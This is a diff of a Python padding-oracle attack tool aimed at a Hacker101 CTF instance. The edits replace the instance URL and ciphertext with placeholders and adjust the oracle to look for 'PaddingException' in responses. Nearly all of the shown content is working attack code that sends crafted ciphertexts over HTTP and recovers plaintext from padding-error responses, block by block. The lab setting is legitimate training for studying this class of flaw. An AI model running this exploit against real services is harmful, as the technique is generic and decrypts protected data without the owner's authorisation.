@@ -1,6 +1,10 @@
 #!/usr/bin/env python3
 """
 AES-CBC Padding Oracle Attack Tool
+
+Oracle rule for this lab:
+  invalid AES padding -> response contains "PaddingException"
+  valid padding       -> anything else (often a json.loads traceback)
 """
 
 import base64
@@ -8,8 +12,8 @@ import requests
 from urllib.parse import quote
 
 # ==================== CONFIG ====================
-TARGET_URL = "https://6a5f15cb6c90c2b33eabedd6592f6c64.ctf.hacker101.com/"
-ENCODED_CT = "93lLZZiWAT8AB39I1HPwKpnhjnQ5ZPHvfxIUT!AwixIMApx-AGeO5Ttq66HgWgXcOfLd4h1IrLQzGRv1!Nj5z6bJsrRXySwUpj!0BcBfjIM!4HH3XxMwsE5TfdGWbwqM8fa!QSU52SauyLElsq89sZiXwj-6DiKQijLUDLNNlrqWlwX-vTEpfN0Oo0du1dFYYK3DqCCUSOaiN1q-nahZlg~~"
+TARGET_URL = "https://YOUR_INSTANCE.ctf.hacker101.com/"
+ENCODED_CT = "PASTE_THE_POST_VALUE_HERE"
 
 DEBUG = False
 
@@ -29,19 +33,10 @@ def is_valid_padding(ciphertext: bytes) -> bool:
     url = f"{TARGET_URL}?post={quote(encoded, safe='')}"
     try:
         r = requests.get(url, timeout=10)
-        body = r.text.lower()
-
         if DEBUG:
-            print(f"  [debug] {r.status_code} | {body[:300]}")
-
-        # Real invalid-padding indicators
-        if "padding is incorrect" in body or "invalid padding" in body:
-            return False
-        if "paddingerror" in body or "bad decrypt" in body:
-            return False
-
-        # Everything else = valid padding
-        return True
+            print(f"  [debug] {r.status_code} | {r.text[:200].replace(chr(10), ' ')}")
+        # Only AES unpad failure is a negative oracle
+        return "PaddingException" not in r.text
     except Exception as e:
         if DEBUG:
             print(f"  [debug] exception: {e}")
@@ -66,11 +61,12 @@ def attack_block(prev_block: bytes, target_block: bytes) -> bytes:
                 intermediate[-pad_len] = guess ^ pad_len
                 plaintext[-pad_len] = intermediate[-pad_len] ^ prev_block[-pad_len]
                 found = True
+                print(f"    byte {BLOCK - pad_len}: {plaintext[-pad_len]:02x}")
                 break
         if not found:
             raise RuntimeError(
-                f"Failed to find byte for padding length {pad_len}.\n"
-                "→ Set DEBUG = True and re-run to inspect responses."
+                f"Failed at padding length {pad_len}. "
+                "Instance may be dead (404) or TARGET_URL/ENCODED_CT is wrong."
             )
 
     return bytes(plaintext)
@@ -80,12 +76,12 @@ def decrypt(ciphertext: bytes) -> bytes:
         raise ValueError("Ciphertext length must be multiple of block size")
 
     iv = ciphertext[:BLOCK]
-    blocks = [ciphertext[i:i+BLOCK] for i in range(BLOCK, len(ciphertext), BLOCK)]
+    blocks = [ciphertext[i:i + BLOCK] for i in range(BLOCK, len(ciphertext), BLOCK)]
 
     plaintext = b""
     prev = iv
     for i, block in enumerate(blocks):
-        print(f"[*] Decrypting block {i+1}/{len(blocks)} ...")
+        print(f"[*] Decrypting block {i + 1}/{len(blocks)} ...")
         pt_block = attack_block(prev, block)
         plaintext += pt_block
         prev = block
@@ -101,7 +97,7 @@ if __name__ == "__main__":
     ct = custom_b64_decode(ENCODED_CT)
     print(f"[+] Ciphertext length: {len(ct)} bytes")
 
-    print("[*] Starting padding-oracle attack (this can take several minutes)...")
+    print("[*] Starting padding-oracle attack...")
     pt = decrypt(ct)
     print("\n[+] Recovered plaintext:")
     print(pt.decode(errors="replace"))
